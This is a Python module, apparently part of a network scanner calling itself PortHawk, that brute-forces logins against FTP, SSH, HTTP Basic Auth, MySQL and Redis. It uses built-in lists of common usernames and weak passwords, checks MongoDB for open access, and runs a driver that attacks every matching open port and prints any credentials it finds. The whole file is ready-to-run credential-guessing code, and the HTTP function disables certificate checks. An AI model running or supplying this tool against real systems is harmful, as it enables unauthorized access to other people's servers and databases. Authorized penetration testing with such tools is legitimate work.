"""
Brute Force module: SSH, FTP, HTTP, MySQL, MongoDB, Redis brute force.
"""

import socket
import ssl
import urllib.request
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed


# ─── WORDLISTS ──────────────────────────────────────────────────────────────

USERNAMES = [
    "admin", "root", "user", "test", "guest", "administrator",
    "manager", "operator", "support", "service", "oracle",
    "postgres", "mysql", "ftp", "anonymous", "pi", "ubuntu",
    "debian", "centos", "vagrant", "deploy", "git", "svn",
]

PASSWORDS = [
    "", "admin", "root", "password", "123456", "12345678",
    "password123", "admin123", "root123", "test", "guest",
    "letmein", "welcome", "monkey", "dragon", "master",
    "qwerty", "abc123", "pass", "login", "admin@123",
    "password1", "1234", "111111", "000000", "654321",
    "123123", "superman", "batman", "iloveyou", "sunshine",
    "princess", "football", "shadow", "michael", "hunter",
    "raspberry", "toor", "alpine", "changeme", "default",
]


# ─── FTP BRUTE ──────────────────────────────────────────────────────────────

def ftp_brute(ip: str, port: int = 21, timeout: float = 3.0,
              users: list = None, passwords: list = None) -> list:
    """Brute force FTP login."""
    users = users or USERNAMES
    passwords = passwords or PASSWORDS
    found = []
    stop = threading.Event()

    def try_cred(user, pwd):
        if stop.is_set():
            return None
        try:
            with socket.create_connection((ip, port), timeout=timeout) as s:
                s.recv(1024)
                s.sendall(f"USER {user}\r\n".encode())
                s.recv(1024)
                s.sendall(f"PASS {pwd}\r\n".encode())
                resp = s.recv(1024).decode(errors="ignore")
                if "230" in resp:
                    return (user, pwd)
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(try_cred, u, p): (u, p)
                   for u in users for p in passwords}
        for f in as_completed(futures):
            result = f.result()
            if result:
                found.append(result)
                stop.set()
                break

    return found


# ─── SSH BRUTE ──────────────────────────────────────────────────────────────

def ssh_brute(ip: str, port: int = 22, timeout: float = 5.0,
              users: list = None, passwords: list = None) -> list:
    """
    Brute force SSH login.
    Note: Needs 'paramiko' — tries basic banner check if not available.
    """
    users = users or USERNAMES
    passwords = passwords or PASSWORDS
    found = []

    try:
        import paramiko
        stop = threading.Event()

        def try_cred(user, pwd):
            if stop.is_set():
                return None
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=user, password=pwd,
                               timeout=timeout, allow_agent=False,
                               look_for_keys=False)
                client.close()
                return (user, pwd)
            except paramiko.AuthenticationException:
                return None
            except Exception:
                return None

        with ThreadPoolExecutor(max_workers=4) as ex:
            futures = {ex.submit(try_cred, u, p): (u, p)
                       for u in users for p in passwords}
            for f in as_completed(futures):
                result = f.result()
                if result:
                    found.append(result)
                    stop.set()
                    break

    except ImportError:
        return [("error", "paramiko not installed — run: pip install paramiko")]

    return found


# ─── HTTP BRUTE ─────────────────────────────────────────────────────────────

def http_brute(host: str, port: int = 80,
               path: str = "/admin/",
               users: list = None, passwords: list = None,
               timeout: float = 5.0) -> list:
    """Brute force HTTP Basic Auth."""
    users = users or USERNAMES
    passwords = passwords or PASSWORDS
    found = []
    stop = threading.Event()

    def try_cred(user, pwd):
        if stop.is_set():
            return None
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{host}:{port}{path}"
        import base64
        creds = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            req = urllib.request.Request(url, headers={
                "Authorization": f"Basic {creds}",
                "User-Agent": "PortHawk/2.0",
            })
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                if r.status == 200:
                    return (user, pwd)
        except urllib.error.HTTPError as e:
            if e.code not in (401, 403):
                return (user, pwd)
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(try_cred, u, p): (u, p)
                   for u in users for p in passwords}
        for f in as_completed(futures):
            result = f.result()
            if result:
                found.append(result)
                stop.set()
                break

    return found


# ─── MYSQL BRUTE ────────────────────────────────────────────────────────────

def mysql_brute(ip: str, port: int = 3306, timeout: float = 3.0,
                users: list = None, passwords: list = None) -> list:
    """Basic MySQL brute force using banner response."""
    users = users or ["root", "admin", "mysql", "user"]
    passwords = passwords or PASSWORDS
    found = []

    try:
        import subprocess
        for user in users:
            for pwd in passwords:
                try:
                    cmd = ["mysql", "-h", ip, "-P", str(port),
                           f"-u{user}", f"-p{pwd}", "-e", "quit"]
                    r = subprocess.run(cmd, capture_output=True,
                                       timeout=timeout)
                    if r.returncode == 0:
                        found.append((user, pwd))
                        return found
                except Exception:
                    pass
    except Exception:
        pass

    return found


# ─── REDIS BRUTE ────────────────────────────────────────────────────────────

def redis_brute(ip: str, port: int = 6379, timeout: float = 3.0,
                passwords: list = None) -> list:
    """Brute force Redis AUTH."""
    passwords = passwords or PASSWORDS
    found = []

    for pwd in passwords:
        try:
            with socket.create_connection((ip, port), timeout=timeout) as s:
                if pwd:
                    s.sendall(f"AUTH {pwd}\r\n".encode())
                else:
                    s.sendall(b"PING\r\n")
                resp = s.recv(128).decode(errors="ignore")
                if "+OK" in resp or "+PONG" in resp:
                    found.append(("default", pwd))
                    return found
        except Exception:
            pass

    return found


# ─── MONGODB BRUTE ──────────────────────────────────────────────────────────

def mongodb_brute(ip: str, port: int = 27017, timeout: float = 3.0) -> list:
    """Check if MongoDB allows unauthenticated access."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            # Send isMaster command
            msg = bytes.fromhex(
                "3a000000" "01000000" "00000000" "d4070000"
                "00000000" "61646d69" "6e2e2463" "6d640000"
                "00000000" "ffffffff" "13000000" "10697357"
                "61737465" "72000100" "000000"
            )
            s.sendall(msg)
            resp = s.recv(1024)
            if resp and len(resp) > 10:
                return [("none", "no auth required")]
    except Exception:
        pass
    return []


# ─── RUNNER ─────────────────────────────────────────────────────────────────

def run_brute_force(host: str, ip: str, open_ports: list,
                    custom_users: list = None,
                    custom_passwords: list = None) -> list:
    """Run brute force on all relevant open ports."""
    findings = []
    port_nums = {p.port: p for p in open_ports}

    brute_map = {
        21:    ("FTP",     lambda: ftp_brute(ip, 21,
                           users=custom_users, passwords=custom_passwords)),
        22:    ("SSH",     lambda: ssh_brute(ip, 22,
                           users=custom_users, passwords=custom_passwords)),
        80:    ("HTTP",    lambda: http_brute(host, 80,
                           users=custom_users, passwords=custom_passwords)),
        443:   ("HTTPS",   lambda: http_brute(host, 443,
                           users=custom_users, passwords=custom_passwords)),
        3306:  ("MySQL",   lambda: mysql_brute(ip, 3306,
                           users=custom_users, passwords=custom_passwords)),
        6379:  ("Redis",   lambda: redis_brute(ip, 6379,
                           passwords=custom_passwords)),
        27017: ("MongoDB", lambda: mongodb_brute(ip, 27017)),
        8080:  ("HTTP",    lambda: http_brute(host, 8080,
                           users=custom_users, passwords=custom_passwords)),
    }

    for port, (service, fn) in brute_map.items():
        if port in port_nums:
            print(f"      {service}:{port} ", end="", flush=True)
            try:
                results = fn()
                if results:
                    for user, pwd in results:
                        if user == "error":
                            print(f"⚠️  {pwd}")
                        else:
                            print(f"✅ FOUND: {user}:{pwd}")
                            findings.append({
                                "port": port,
                                "service": service,
                                "username": user,
                                "password": pwd,
                            })
                else:
                    print("No credentials found")
            except Exception as e:
                print(f"Error: {e}")

    return findings
